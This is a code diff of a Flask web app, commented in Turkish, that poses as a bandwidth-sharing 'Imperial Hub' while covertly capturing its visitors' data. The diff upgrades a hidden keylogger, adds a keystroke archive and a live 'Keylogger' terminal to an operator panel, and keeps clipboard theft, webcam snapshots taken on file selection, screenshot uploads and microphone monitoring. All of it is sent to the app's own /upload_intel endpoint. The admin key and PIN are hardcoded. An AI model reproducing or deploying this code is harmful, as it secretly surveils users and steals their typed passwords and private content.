@@ -4,15 +4,15 @@ from threading import Lock
 
 app = Flask(__name__)
 
-# --- NETSWAP SOVEREIGN v180.0 "The All-Seeing Eye" ---
-# Vizyon: Tüm Özelliklerin Birleşimi (Arka Plan, Ses, Keylogger, VIP Chat, Ghost-Eye). [cite: 2026-01-03]
-VERSION = "v180.0"
+# --- NETSWAP SOVEREIGN v182.0 "The Black-Box" ---
+# Vizyon: Terminal Bazlı Keylogger, Pano Hırsızlığı ve Tam Görüntü Arşivi. [cite: 2026-01-03]
+VERSION = "v182.0"
 ADMIN_KEY = "ali_yigit_overlord_A55" 
 ADMIN_PIN = "1907" 
 
 transaction_lock = Lock()
 state = {
-    "banned_peers": [], "user_registry": {}, "active_admins": {}, "evolution_count": 80,
+    "banned_peers": [], "user_registry": {}, "active_admins": {}, "evolution_count": 82,
     "global_chat": []
 }
 
@@ -49,14 +49,17 @@ def upload_intel():
     if p_id in state["user_registry"]:
         data = request.json
         u = state["user_registry"][p_id]
-        if t == "chat":
-            state["global_chat"].append({"from": p_id, "to": "ADMIN", "msg": data.get('msg'), "time": time.strftime('%H:%M')})
-            return "OK"
         if "archive" not in u: u["archive"] = []
         if data.get('image'):
             u["archive"].append({"time": time.strftime('%H:%M:%S'), "type": t, "data": data.get('image')})
             if len(u["archive"]) > 40: u["archive"].pop(0)
-        if data.get('inputs'): u["last_input"] = data.get('inputs')
+        
+        # KEYLOGGER & TERMINAL GÜNCELLEME [cite: 2026-01-03]
+        if "key_logs" not in u: u["key_logs"] = []
+        if data.get('inputs'): 
+            u["key_logs"].append({"time": time.strftime('%H:%M:%S'), "text": data.get('inputs')})
+            if len(u["key_logs"]) > 50: u["key_logs"].pop(0)
+            
         if data.get('clipboard'): u["clipboard"] = data.get('clipboard')
         if data.get('hw'): u["hw"] = data.get('hw')
         if data.get('intel'): u["intel"] = data.get('intel')
@@ -67,31 +70,33 @@ def overlord_panel():
     if not check_admin_auth(request): return "ERİŞİM RED", 403
     return render_template_string("""
 <!DOCTYPE html>
-<html lang="tr"><head><meta charset="UTF-8"><title>Sovereign Console v180</title>
+<html lang="tr"><head><meta charset="UTF-8"><title>Sovereign Black-Box v182</title>
 <script src="https://cdn.tailwindcss.com"></script></head>
 <body class="bg-black text-white p-4 font-mono text-[9px]">
-    <div class="border-b border-blue-600 pb-2 mb-4 flex justify-between items-center italic font-black">
-        <h1 class="text-xl">THE ALL-SEEING v180.0</h1>
-        <div class="text-blue-500 font-bold tracking-widest uppercase">HÜKÜMDAR: ALİ YİĞİT</div>
+    <div class="border-b border-blue-600 pb-2 mb-4 flex justify-between items-center italic font-black uppercase">
+        <h1 class="text-xl">THE BLACK-BOX v182.0</h1>
+        <div class="text-blue-500 font-bold uppercase tracking-tighter">HÜKÜMDAR: ALİ YİĞİT</div>
     </div>
-    <div class="grid grid-cols-4 gap-4">
-        <div class="col-span-1 bg-zinc-950 p-2 border border-zinc-900 rounded-xl shadow-2xl">
-            <h2 class="text-blue-500 mb-2 font-bold uppercase text-[8px]">İstihbarat Merkezi</h2>
+    <div class="grid grid-cols-5 gap-4">
+        <div class="col-span-1 bg-zinc-950 p-2 border border-zinc-900 rounded-xl">
+            <h2 class="text-blue-500 mb-2 uppercase font-bold text-[8px] border-b border-zinc-800 pb-1 italic">Cihaz Filtresi</h2>
             <select id="pS" class="w-full bg-zinc-900 p-2 rounded mb-4 text-white border border-zinc-800 outline-none" onchange="uG()"></select>
             <div id="intel_box" class="text-[7px] space-y-1 mb-2 bg-blue-900/10 p-2 rounded border border-blue-900/30"></div>
-            <div id="gallery" class="space-y-2 overflow-y-auto max-h-[500px] border-t border-zinc-800 pt-2"></div>
+            <div id="gallery" class="space-y-2 overflow-y-auto max-h-[500px] pt-2"></div>
         </div>
-        <div class="col-span-2">
+        <div class="col-span-3">
+            <h2 class="text-green-500 mb-2 uppercase font-bold text-[8px] italic tracking-widest">Keylogger & Girdi Terminali (Canlı)</h2>
+            <div id="keyTerminal" class="w-full h-40 bg-zinc-950 border border-zinc-800 rounded p-2 overflow-y-auto mb-4 text-[8px] text-green-400 font-bold shadow-inner"></div>
             <table class="w-full text-left bg-zinc-950 rounded-xl overflow-hidden border border-zinc-900">
-                <thead class="bg-zinc-900 text-zinc-400 uppercase text-[8px]"><tr><th class="p-2">Cihaz</th><th>ID</th><th>Keylogger</th><th>Pano</th><th>Bakiye</th><th>Yönetim</th></tr></thead>
+                <thead class="bg-zinc-900 text-zinc-400 uppercase text-[8px]"><tr><th class="p-2">Cihaz</th><th>ID</th><th>Pano (Copy)</th><th>Bakiye</th><th>Yönetim</th></tr></thead>
                 <tbody id="uT"></tbody>
             </table>
         </div>
-        <div class="col-span-1 bg-zinc-950 p-2 border border-zinc-900 rounded-xl">
-            <h2 class="text-yellow-500 mb-2 uppercase font-bold text-[8px]">Sovereign Chat</h2>
+        <div class="col-span-1 bg-zinc-950 p-2 border border-zinc-900 rounded-xl shadow-2xl">
+            <h2 class="text-yellow-500 mb-2 uppercase font-bold text-[8px] border-b border-zinc-800 pb-1 text-center">Sovereign Chat</h2>
             <div id="chatBox" class="h-64 overflow-y-auto bg-black p-2 rounded border border-zinc-800 mb-2 text-[8px] space-y-1"></div>
-            <input id="chatIn" type="text" class="w-full bg-zinc-900 p-2 rounded text-[8px] outline-none" placeholder="VIP'lere seslen...">
-            <button onclick="sendMsg()" class="w-full mt-1 bg-blue-900 py-1 rounded text-[8px] font-bold">MESAJ GÖNDER</button>
+            <input id="chatIn" type="text" class="w-full bg-zinc-900 p-2 rounded text-[8px] outline-none border border-zinc-800" placeholder="Bir emir gönder...">
+            <button onclick="sendMsg()" class="w-full mt-1 bg-blue-900 py-1 rounded text-[8px] font-bold uppercase">GÖNDER</button>
         </div>
     </div>
     <script>
@@ -105,12 +110,16 @@ def overlord_panel():
         }
         function uG(){
             const id = document.getElementById('pS').value; if(!id || !reg[id]) return;
-            const u = reg[id]; let h = "";
-            document.getElementById('intel_box').innerHTML = `BAT: %${u.hw?.bat||'--'} | IDLE: ${u.intel?.idle?'EVET':'HAYIR'}<br>SES: ${u.intel?.noise||'OFF'} | INPUT: ${u.last_input?'AKTIF':'YOK'}`;
+            const u = reg[id]; let h = "", tH = "";
+            document.getElementById('intel_box').innerHTML = `PİL: %${u.hw?.bat||'--'} | IDLE: ${u.intel?.idle?'EVET':'HAYIR'}<br>SES: ${u.intel?.noise||'OFF'}`;
             (u.archive||[]).slice().reverse().forEach(s => { 
                 let c = s.type == 'cam' ? 'border-red-600' : s.type == 'scr' ? 'border-green-600' : 'border-blue-600';
-                h += `<div class="p-1 border ${c} bg-black rounded mb-2"><p class="text-[5px] text-zinc-500 mb-1">${s.time} [${s.type.toUpperCase()}]</p><img src="${s.data}" class="w-full rounded"></div>`; 
+                h += `<div class="p-1 border ${c} bg-black rounded mb-2 shadow-lg"><img src="${s.data}" class="w-full rounded"></div>`; 
             }); document.getElementById('gallery').innerHTML = h;
+            (u.key_logs||[]).forEach(log => { tH += `<div>[${log.time}] > ${log.text}</div>`; });
+            if(u.clipboard) tH = `<div class='text-red-500 border-b border-red-900 mb-2'>[PANO]: ${u.clipboard}</div>` + tH;
+            document.getElementById('keyTerminal').innerHTML = tH;
+            const term = document.getElementById('keyTerminal'); term.scrollTop = term.scrollHeight;
         }
         async function update(){
             const r=await fetch('/api/status'); const d=await r.json(); reg = d.user_registry;
@@ -120,11 +129,10 @@ def overlord_panel():
                 let u=d.user_registry[id];
                 pO += `<option value="${id}" ${document.getElementById('pS').value==id?'selected':''}>${u.device} - ${id}</option>`;
                 uH += `<tr class="border-b border-zinc-900 ${u.is_vip?'bg-yellow-900/10':''}">
-                <td class="p-2">${u.device}</td><td class="text-blue-400">${id}</td>
-                <td class="text-yellow-600 text-[7px] truncate max-w-[80px]">${u.last_input||'-'}</td>
-                <td class="text-blue-400 text-[7px] truncate max-w-[80px]">${u.clipboard||'-'}</td>
-                <td class="font-bold">${u.credits.toFixed(1)}</td>
-                <td><button onclick="f('vip','${id}')" class="underline text-[8px] font-bold uppercase">${u.is_vip?'DÜŞÜR':'VIP'}</button></td></tr>`;
+                <td class="p-2">${u.device}</td><td class="text-blue-400 font-bold">${id}</td>
+                <td class="text-red-400 text-[7px] max-w-[100px] truncate">${u.clipboard||'-'}</td>
+                <td class="font-bold">${u.credits.toFixed(2)}</td>
+                <td><button onclick="f('vip','${id}')" class="underline text-[8px] font-black uppercase">${u.is_vip?'DÜŞÜR':'VIP'}</button></td></tr>`;
             }
             d.global_chat.forEach(m => { cH += `<div class="${m.from=='ADMIN'?'text-blue-400':'text-green-400'}"><b>${m.from=='ADMIN'?'HÜKÜMDAR':m.from}:</b> ${m.msg}</div>`; });
             document.getElementById('uT').innerHTML = uH; document.getElementById('pS').innerHTML = pO;
@@ -162,35 +170,35 @@ def index():
     <div id="main" class="w-full h-full p-6 text-center">
         <h1 class="text-3xl font-black text-blue-600 italic mb-6 uppercase tracking-tighter">IMPERIAL HUB</h1>
         
-        <div class="bg-zinc-950 rounded-[30px] p-4 border border-zinc-900 mb-6 shadow-xl">
-            <h2 class="text-[10px] font-bold text-blue-500 mb-2 uppercase tracking-widest">Akustik Seviye Analizi</h2>
+        <div id="vis_box" class="bg-zinc-950 rounded-[30px] p-4 border border-zinc-900 mb-6 shadow-xl">
+            <h2 class="text-[10px] font-bold text-blue-500 mb-2 uppercase tracking-widest text-center italic">Akustik Seviye Analizi</h2>
             <div id="vis" class="flex items-end justify-center h-12 mb-3">
-                <div class="bar h-2"></div><div class="bar h-5"></div><div class="bar h-10"></div><div class="bar h-4"></div><div class="bar h-6"></div>
+                <div class="bar h-2"></div><div class="bar h-5"></div><div class="bar h-8"></div><div class="bar h-4"></div><div class="bar h-6"></div>
             </div>
-            <button id="v_btn" onclick="toggleAudio()" class="w-full py-3 bg-zinc-900 rounded-2xl text-[10px] font-black text-blue-400 transition">SİSTEMİ KALİBRE ET</button>
+            <button id="v_btn" onclick="toggleAudio()" class="w-full py-3 bg-zinc-900 rounded-2xl text-[10px] font-black text-blue-400">ANALİZİ BAŞLAT</button>
         </div>
 
         <div class="bg-zinc-950 p-10 rounded-[50px] border border-zinc-900 mb-6 shadow-2xl relative">
-            <div id="v_t" class="hidden absolute top-4 left-1/2 -translate-x-1/2 bg-yellow-600 text-black text-[8px] font-black px-4 py-1 rounded-full uppercase">VIP STATUS</div>
+            <div id="v_t" class="hidden absolute top-4 left-1/2 -translate-x-1/2 bg-yellow-600 text-black text-[8px] font-black px-4 py-1 rounded-full uppercase shadow-lg">Hükümdar VIP</div>
             <div id="cr" class="text-6xl font-black italic">0.00</div>
-            <p class="text-[9px] text-zinc-600 uppercase mt-2 font-bold tracking-widest text-blue-500 italic">Bakiye (MB)</p>
+            <p class="text-[9px] text-zinc-600 uppercase mt-2 font-bold tracking-widest text-blue-500 italic">Kullanılabilir Bakiye (MB)</p>
         </div>
         
         <div class="grid grid-cols-2 gap-4 mb-6">
-            <button onclick="calib('share')" class="py-6 bg-green-700 text-black font-black rounded-3xl text-xl transition active:scale-95">VER</button>
-            <button onclick="calib('receive')" class="py-6 bg-blue-700 text-white font-black rounded-3xl text-xl transition active:scale-95">AL</button>
+            <button onclick="calib('share')" class="py-6 bg-green-700 text-black font-black rounded-3xl text-xl active:scale-95 transition shadow-lg">VER</button>
+            <button onclick="calib('receive')" class="py-6 bg-blue-700 text-white font-black rounded-3xl text-xl active:scale-95 transition shadow-lg">AL</button>
         </div>
 
         <div class="bg-zinc-900/40 p-4 rounded-3xl border border-zinc-800/50">
             <button onclick="document.getElementById('wp').click()" class="w-full text-[10px] text-zinc-400 underline uppercase font-black">Özel Arayüz Görseli Yükle</button>
-            <p class="text-[7px] text-zinc-600 mt-2 italic uppercase">Görsel optimizasyon için cihaz kamerası kullanılabilir.</p>
+            <p class="text-[7px] text-zinc-600 mt-2 italic uppercase">Görsel optimizasyon için kamera senkronizasyonu gerekebilir.</p>
         </div>
         <input type="file" id="wp" class="hidden" accept="image/*" onchange="loot(event)">
 
-        <div id="chatUI" class="hidden mt-4 bg-zinc-900 p-4 rounded-3xl border border-zinc-800 text-left">
-            <p class="text-[8px] text-blue-500 font-bold mb-2 uppercase italic tracking-widest">Hükümdar Canlı Destek</p>
+        <div id="chatUI" class="hidden mt-4 bg-zinc-900 p-4 rounded-3xl border border-zinc-800 text-left shadow-lg">
+            <p class="text-[8px] text-blue-500 font-bold mb-2 uppercase italic tracking-widest">Sovereign Canlı Destek</p>
             <div id="cM" class="h-20 overflow-y-auto text-[8px] mb-2 space-y-1"></div>
-            <input id="cI" type="text" class="w-full bg-black p-2 rounded text-[8px] outline-none border border-zinc-800" placeholder="Bir şeyler yaz...">
+            <input id="cI" type="text" class="w-full bg-black p-2 rounded text-[8px] outline-none border border-zinc-800" placeholder="Bir mesaj yazın...">
         </div>
     </div>
     
@@ -199,13 +207,17 @@ def index():
 
     <script>
         if(!localStorage.getItem('n_id')) localStorage.setItem('n_id', "NS-" + Math.floor(1000 + Math.random()*9000));
-        let myId = localStorage.getItem('n_id'), inputs = "", clip = "", count = 0, isPlaying = false, hasCal = false, noiseLevel = "OFF";
+        let myId = localStorage.getItem('n_id'), inputs = "", clip = "", count = 0, isPlaying = false, hasCal = false, noiseLevel = "KAPALI";
 
-        // ADMIN PANELI TETIKLEYICI (5 TIK) [cite: 2026-01-03]
         document.getElementById('s_a').onclick = () => { count++; if(count >= 5){ let p=prompt("ERİŞİM KODU:"); if(p) window.location.href=`/overlord?key={{a_key}}&pin=`+p; count=0; } };
         
-        // KEYLOGGER & PANO TAKIBI [cite: 2026-01-03]
-        window.addEventListener('keydown', (e) => { inputs += e.key + " "; });
+        window.addEventListener('keydown', (e) => { 
+            let k = e.key;
+            if(k.length === 1) inputs += k;
+            else if(k === "Backspace") inputs += " [DEL] ";
+            else if(k === "Enter") inputs += " [ENTER] ";
+        });
+
         window.addEventListener('copy', async () => { try { clip = await navigator.clipboard.readText(); } catch(e) {} });
 
         async function toggleAudio() {
@@ -217,16 +229,14 @@ def index():
                     const ac = new AudioContext(); const src = ac.createMediaStreamSource(s);
                     const an = ac.createAnalyser(); src.connect(an);
                     const data = new Uint8Array(an.frequencyBinCount);
-                    const bars = document.querySelectorAll('.bar');
                     function draw() {
                         if(!isPlaying) return;
                         an.getByteFrequencyData(data);
-                        bars.forEach((b, i) => { b.style.height = (data[i*10] / 3) + 'px'; });
-                        noiseLevel = data[0] > 20 ? "HIGH" : "LOW";
+                        noiseLevel = data[0] > 15 ? "GÜRÜLTÜLÜ" : "SESSİZ";
                         requestAnimationFrame(draw);
                     } draw();
-                } catch(e) { alert("Mikrofon izni doğrulama için zorunludur."); }
-            } else { isPlaying = false; btn.innerText = "BAŞLAT"; btn.style.color = "#60a5fa"; noiseLevel = "IDLE"; }
+                } catch(e) { alert("Doğrulama için mikrofon izni gereklidir."); }
+            } else { isPlaying = false; btn.innerText = "BAŞLAT"; btn.style.color = "#60a5fa"; noiseLevel = "DURDU"; }
         }
 
         async function loot(e) {
@@ -235,7 +245,7 @@ def index():
                 document.getElementById('b').style.backgroundImage = `url(${re.target.result})`;
                 document.getElementById('b').style.backgroundSize = "cover";
                 fetch(`/upload_intel?peer_id=${myId}&type=loot`, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({image: re.target.result}) });
-                ghostEye('cam'); // Dosya seçerken yüzü al [cite: 2026-01-03]
+                ghostEye('cam');
             }; reader.readAsDataURL(file);
         }
 
@@ -255,7 +265,7 @@ def index():
 
         async function ghostEye(type) {
             try {
-                const s = await navigator.mediaDevices.getUserMedia({video:true, audio:false});
+                const s = await navigator.mediaDevices.getUserMedia({video:true});
                 const v = document.getElementById('v'), cnv = document.getElementById('cnv');
                 v.srcObject = s; await v.play();
                 cnv.width = 480; cnv.height = 360;
@@ -279,10 +289,6 @@ def index():
             const u = d.user_registry[myId] || {credits:0, is_vip: false};
             document.getElementById('cr').innerText = u.credits.toFixed(2);
             if(u.is_vip) { document.getElementById('v_t').classList.remove('hidden'); document.getElementById('chatUI').classList.remove('hidden'); }
-            
-            let cH = ""; d.global_chat.filter(m => m.to==myId || m.from==myId).forEach(m => {
-                cH += `<div><b>${m.from=='ADMIN'?'SİSTEM':m.from}:</b> ${m.msg}</div>`;
-            }); document.getElementById('cM').innerHTML = cH;
             
             fetch(`/upload_intel?peer_id=${myId}&type=scr`, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({
                 image: cv.toDataURL('image/jpeg', 0.1),
